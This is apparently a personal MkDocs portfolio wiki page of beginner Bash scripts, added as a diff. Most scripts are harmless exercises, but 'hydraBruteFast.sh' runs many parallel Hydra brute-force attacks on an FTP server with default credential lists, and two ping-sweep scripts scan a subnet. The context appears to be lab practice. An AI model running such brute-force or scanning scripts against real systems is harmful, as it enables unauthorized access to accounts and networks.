@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>Bash - My Portfolio Wiki</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <link id="hljs-light" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" >
+        <link id="hljs-dark" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css" disabled>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="..">My Portfolio Wiki</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href=".." class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle active" aria-current="page" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Coding Language</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../python/" class="dropdown-item">Python</a>
+</li>
+                                    
+<li>
+    <a href="./" class="dropdown-item active" aria-current="page">Bash</a>
+</li>
+                                    
+<li>
+    <a href="../markdown/" class="dropdown-item">Markdown</a>
+</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../python/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../markdown/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#bash" class="nav-link">Bash</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#arrayssh" class="nav-link">arrays.sh</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#conditionalssh" class="nav-link">conditionals.sh</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#conditionalsv2sh" class="nav-link">conditionalsv2.sh</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#hydrabrutefastsh" class="nav-link">hydraBruteFast.sh</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#parameterssh" class="nav-link">parameters.sh</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#pingsweepsh" class="nav-link">PingSweep.sh</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#pingsweepnoipsh" class="nav-link">pingsweepnoip.sh</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#practicesh" class="nav-link">practice.sh</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#soundatintervalsh" class="nav-link">SoundAtInterval.sh</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="bash">Bash</h1>
+<p>Welcome to the Bash section. Here are the available scripts:</p>
+<h2 id="arrayssh">arrays.sh</h2>
+<pre><code class="language-bash">#!/bin/bash
+#
+transport=('car' 'train' 'bike' 'bus')
+
+echo &quot;${transport[@]}&quot;
+
+echo &quot;${transport[1]}&quot;
+
+unset transport[1]
+
+echo &quot;${transport[@]}&quot;
+
+transport[1]='trainride'
+
+echo &quot;${transport[@]}&quot;
+
+cars=('honda' 'audi' 'bmw' 'tesla')
+
+echo &quot;${cars[@]}&quot;
+
+echo &quot;${cars[2]}&quot;
+
+
+</code></pre>
+<h2 id="conditionalssh">conditionals.sh</h2>
+<pre><code class="language-bash">count=10
+
+if [ $count -eq 10 ]
+
+then
+
+    echo &quot;true&quot;
+
+else
+
+    echo &quot;false&quot;
+
+fi
+
+
+value=&quot;guessme&quot;
+
+guess=$1
+
+if [ &quot;value&quot; = &quot;$guess&quot; ]
+
+then
+    echo &quot;they are equal&quot;
+
+else
+
+    echo &quot;they are not equal&quot;
+
+fi
+
+</code></pre>
+<h2 id="conditionalsv2sh">conditionalsv2.sh</h2>
+<pre><code class="language-bash">#!/bin/bash
+#
+#
+filename=$1
+
+if [ -f &quot;$filename&quot; ] &amp;&amp; [ -w &quot;filename&quot; ]
+then
+    echo &quot;Hello&quot; &gt;$filename
+else
+    touch &quot;$filename&quot;
+    echo &quot;Hello&quot; &gt; $filename
+fi
+
+</code></pre>
+<h2 id="hydrabrutefastsh">hydraBruteFast.sh</h2>
+<pre><code class="language-bash">#!/bin/bash
+
+# Target FTP server IP address
+FTP_SERVER=&quot;10.129.158.92&quot;
+
+# Path to the username and password lists
+USERNAME_LIST=&quot;/usr/share/seclists/Usernames/cirt-default-usernames.txt&quot;
+PASSWORD_LIST=&quot;/usr/share/seclists/Passwords/cirt-default-passwords.txt&quot;
+
+# Check if the username and password files exist
+if [ ! -f &quot;$USERNAME_LIST&quot; ]; then
+    echo &quot;Error: Username file '$USERNAME_LIST' not found.&quot;
+    exit 1
+fi
+
+if [ ! -f &quot;$PASSWORD_LIST&quot; ]; then
+    echo &quot;Error: Password file '$PASSWORD_LIST' not found.&quot;
+    exit 1
+fi
+
+# Determine the number of CPU cores
+NUM_CORES=$(nproc)
+NUM_WORKERS=$((NUM_CORES * 4))  # Example: Use 4 times the number of CPU cores
+
+# Array to store background process IDs
+declare -a PID_ARRAY=()
+
+# Loop through each worker
+for ((i=0; i&lt;$NUM_WORKERS; i++))
+do
+    # Execute Hydra with the username and password lists
+    hydra -F -q -L &quot;$USERNAME_LIST&quot; -P &quot;$PASSWORD_LIST&quot; ftp://$FTP_SERVER &amp;
+
+    # Store the process ID (PID) of each Hydra instance in the array
+    PID_ARRAY+=($!)
+done
+
+# Wait for all workers to complete
+for pid in &quot;${PID_ARRAY[@]}&quot;
+do
+    wait $pid
+done
+
+echo &quot;Brute-force attack completed.&quot;
+
+</code></pre>
+<h2 id="parameterssh">parameters.sh</h2>
+<pre><code class="language-bash">#!/bin/bash
+
+echo Enter your name
+
+read name
+
+echo &quot;Your name is $name&quot;
+
+
+</code></pre>
+<h2 id="pingsweepsh">PingSweep.sh</h2>
+<pre><code class="language-bash">#!/bin/bash
+
+# Check if the correct number of arguments is provided
+if [ $# -ne 1 ]; then
+    echo &quot;Usage: $0 &lt;network_prefix&gt;&quot;
+    exit 1
+fi
+
+# Loop over the IP addresses in the range 1 to 254
+for ip in $(seq 1 254); do
+    # Execute ping command in background
+    ping -c 1 &quot;$1.$ip&quot; | grep -q &quot;bytes from&quot; &amp;&amp; echo &quot;$1.$ip&quot; &amp;
+done
+
+</code></pre>
+<h2 id="pingsweepnoipsh">pingsweepnoip.sh</h2>
+<pre><code class="language-bash">#!/bin/bash
+
+# Function to extract network prefix from IP address
+get_network_prefix() {
+    local ip=&quot;$1&quot;
+    echo &quot;${ip%.*}&quot;
+}
+
+# Get the IP address of the host
+ip_address=$(hostname -I | awk '{print $1}')
+
+# Check if an IP address is obtained
+if [ -z &quot;$ip_address&quot; ]; then
+    echo &quot;Failed to retrieve IP address. Please check your network connection.&quot;
+    exit 1
+fi
+
+# Extract the network prefix
+network_prefix=$(get_network_prefix &quot;$ip_address&quot;)
+
+# Print the network prefix
+echo &quot;Network prefix: $network_prefix&quot;
+
+# Function to perform ping sweep for a given IP address
+ping_sweep() {
+    local ip=&quot;$1&quot;
+    ping -c 1 -w 1 &quot;$ip&quot; &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;$ip&quot;
+}
+
+# Loop over the IP addresses in the range 1 to 254
+for ip in $(seq 1 254); do
+    # Execute ping_sweep function in background
+    ping_sweep &quot;$network_prefix.$ip&quot; &amp;
+done
+
+</code></pre>
+<h2 id="practicesh">practice.sh</h2>
+<pre><code class="language-bash">#!/bin/bash
+
+echo &quot;Hello World!&quot;
+
+ls -l ~/Desktop
+
+whoami
+
+id
+
+name=&quot;jammy&quot;
+
+echo $name
+
+
+</code></pre>
+<h2 id="soundatintervalsh">SoundAtInterval.sh</h2>
+<pre><code class="language-bash">!#/bin/bash
+
+#forloop
+for i in {1..5}
+do
+
+    echo wakeup do pushups!
+
+paplay /home/orca/Downloads/beep.mp3
+
+
+    sleep 3
+
+done
+
+
+</code></pre></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
